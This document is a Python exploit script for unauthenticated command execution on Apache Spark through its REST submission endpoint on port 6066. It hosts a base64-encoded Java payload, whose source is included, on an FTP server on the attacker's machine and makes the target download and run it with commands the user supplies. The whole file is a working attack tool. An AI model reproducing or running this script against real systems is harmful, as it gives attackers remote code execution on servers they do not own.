#!/usr/bin/python
# Apache Spark Unauthenticated Command Execution using Java over FTP
import sys
import os
import base64
import subprocess
import signal
import time
import requests
import argparse
parser = argparse.ArgumentParser(description = "Apache Spark Unauthenticated Command Execution Exploit (Java/FTP)")
parser.add_argument("RHOST", help="IP address of target")
parser.add_argument("LHOST", help="IP address of local system")
parser.add_argument("-c", "--command", action="append", required=True, help="Command(s) to execute on target system. Use multiple -c/--command to run multiple commands.")
parser.add_argument("--no-ftp", action="store_true", help="Run exploit with external FTP server")
arguments = parser.parse_args()
RHOST = arguments.RHOST
LHOST = arguments.LHOST
command_list = arguments.command
no_FTP = arguments.no_FTP
try:
    import pyftpdlib
except ImportError:
    print("[-] pyftpdlib is required for this exploit. Please install pyftpdlib or use --no-ftp to use a seperate FTP server.")
working_directory = "/tmp/Apache-Spark-Unauthenticated-Command-Execution-Java-FTP-Files"
if not os.path.exists(working_directory):
    print("[*] Creating working directory " + working_directory + "/")
    os.mkdir(working_directory)
# Exploit.java
'''
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Exploit {
  public static void main(String[] args) throws Exception {
    for (String command: args) {
      String output = "[*] Executing " + command + "\n";
      try {
        Process process = Runtime.getRuntime().exec(command);
        process.waitFor();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = bufferedReader.readLine()) != null) {
          output += line + "\n";
        }
      }
      catch (Exception exception) {
        exception.printStackTrace();
      }
      System.out.println(output);
    }
  }
}
'''
'''
## Compiling Exploit.java:
# javac -source 1.6 -target 1.6 Exploit.java
# jar cf Exploit.jar Exploit.class
# cat Exploit.jar | base64 -w 0
## Set exploit_JAR to base64 value
'''
exploit_JAR = "UEsDBBQACAgIANahGE8AAAAAAAAAAAAAAAAJAAQATUVUQS1JTkYv/soAAAMAUEsHCAAAAAACAAAAAAAAAFBLAwQUAAgICADWoRhPAAAAAAAAAAAAAAAAFAAAAE1FVEEtSU5GL01BTklGRVNULk1G803My0xLLS7RDUstKs7Mz7NSMNQz4OVyLkpNLElN0XWqBAoARfSMFTT8ixKTc1IVnPOLCvKLEkuAijV5uXi5AFBLBwizfXV+QAAAAEIAAABQSwMEFAAICAgAsqEYTwAAAAAAAAAAAAAAAA0AAABFeHBsb2l0LmNsYXNzhVRLUxNBEP6GPCYsyzO8oqBBUUJ4RFFBw0MNBkXDM4hFoYclGajFZDcVNopWWV64WOVJ/4EXznggllRx9OBP8J94IfZsAhhJlalNz8zX3V/PdPfMz6PvhwCGsKygFd0cVxRUoduDq3Ls8SAgx14FQfRJ0a/AjwGOQY6QnF5ToOK6ghoMSXGD46aCRtyqxjBGFNzGHY4wxyiDe0w3dGuCwRHoXWZwTppJwVAf0w0xm0uvieyStpYixJnWdIOhNbAa29ReaaGUZmyE4lZWNzZGpWNt3NISL2e0jG3PMcYxzkG8SnQ7ITKWbhpbtIibuWxCTOmSUo1uZ1Kmbg1KQhVtaGdo+5c8ktNTSZFlqFsNvvBHt0UiZxHsV3EX9xiYouI+IhyTKh4gqmIKD1U8wjRt1abSzVAkt74usiK5KDSbyXesmDYyOYvCCC1d1Kl4jCdyJzEpZlTMIsLgPd3TyVlUzKGdY17FAhY54iqW8JSBl47E0HDqNLe2KRIEeSukrsywiDE0nkLzWTMhtihzbi2TEUaSYSBQoQBnoFLaiN9jmce8zYGzhqNl4RZzhqWnqTbKhrBOFi1lfiWYHJ2CysHQ858dlc5ADvy1pltTZtbuNipRHUX5qwhU/uNI5dUh1/ZARYVsPe+pqlhGG/WQPinbmLo5Q3uy7AZdymoJUZ70N1uWoNAOM0c1ajmhmi/6lMJ7K8B0Hps4ZcgUVboW6EIL3V/5qwKTHU7SR6tOGhmNrmAebI8mDOdIum3QiWqcRwe5kCnzw0Vr4HMw1nc47pjo7PiCD32dQ2HnAapW8nA0Offh8knR5CaxDx52fYNHItVht48w5dkBalYOoK7IVW0edXnUh7mP76NhJez5ga4Slc8lqTxlVLuFX7tQikRNX+GVNs07DrZb2N6j7fbjLd7R01JlH2AYtfYxGsFJI18bBWP0AC0Q/hx1ZOu1rd+jCTtoxkey/UQZ6iSvEbiPwDkuMFbANDw0sxccF+3Pz4kIvxGg297oLhAjqS6QY5edM+pj+l+yU335D1BLBwhq/eceBwMAAEAFAABQSwECFAAUAAgICADWoRhPAAAAAAIAAAAAAAAACQAEAAAAAAAAAAAAAAAAAAAATUVUQS1JTkYv/soAAFBLAQIUABQACAgIANahGE+zfXV+QAAAAEIAAAAUAAAAAAAAAAAAAAAAAD0AAABNRVRBLUlORi9NQU5JRkVTVC5NRlBLAQIUABQACAgIALKhGE9q/eceBwMAAEAFAAANAAAAAAAAAAAAAAAAAL8AAABFeHBsb2l0LmNsYXNzUEsFBgAAAAADAAMAuAAAAAEEAAAAAA=="
output_JAR = open(working_directory + "/Exploit.jar", "wb")
output_JAR.write(base64.b64decode(exploit_JAR))
output_JAR.close()
app_args = "\",\"".join(command_list)
API_endpoint = "http://" + RHOST + ":6066/v1/submissions/create"
API_headers = {
    'Content-Type': "application/json",
    'Connection': "close"
}
API_data = "{\r\n  \"action\": \"CreateSubmissionRequest\",\r\n  \"clientSparkVersion\": \"2.3.1\",\r\n  \"app_args\": [\r\n     \""+ app_args + "\"\r\n  ],\r\n  \"appResource\": \"ftp://" + LHOST + "/Exploit.jar\",\r\n  \"environmentVariables\": {\r\n    \"SPARK_ENV_LOADED\": \"1\"\r\n  },\r\n  \"mainClass\": \"Exploit\",\r\n  \"sparkProperties\": {\r\n    \"spark.jars\": \"ftp://" + LHOST + "/Exploit.jar\",\r\n    \"spark.driver.supervise\": \"false\",\r\n    \"spark.app.name\": \"Exploit\",\r\n    \"spark.eventLog.enabled\": \"true\",\r\n    \"spark.submit.deployMode\": \"cluster\",\r\n    \"spark.master\": \"spark://" + RHOST + ":6066\"\r\n  }\r\n}"
if (no_FTP):
    print("[*] Start your FTP server and set its root directory " + working_directory)
    try:
        input("[*] Press any key to continue")
    except SyntaxError:
        pass
    print("[*] Sending API request to the target")
    post_request = requests.post(API_endpoint, headers=API_headers, data=API_data)
    print("[*] API response from the target:")
    print(post_request.json())
else:
    try:
        print("[*] Starting pyftpdlib FTP server")
        print("[*] Setting timeout to 300 seconds")
        FTP_process = subprocess.Popen(("python -m pyftpdlib -i 0.0.0.0 -p 21 -d " + working_directory + " --username=null --password=null").split(' '), preexec_fn=os.setsid)
        try:
            time.sleep(6)
            print("[*] Sending API request to the target")
            post_request = requests.post(API_endpoint, headers=API_headers, data=API_data)
            print("[*] API response from the target:")
            print(post_request.json())
            time.sleep(300)
            print("[*] Stopping pyftpdlib FTP server")
            os.killpg(os.getpgid(FTP_process.pid), signal.SIGTERM)
            sys.exit()
        except KeyboardInterrupt:
            print("\n[*] Stopping pyftpdlib FTP server")
            os.killpg(os.getpgid(FTP_process.pid), signal.SIGTERM)
            sys.exit()
    except subprocess.CalledProcessError as ftp_error:
        print("[-] pyftpdlib FTP server error" + ftp_error.returncode + "\n" + ftp_error.output)
        print("[*] Stopping pyftpdlib FTP server")
        os.killpg(os.getpgid(FTP_process.pid), signal.SIGTERM)
        sys.exit()
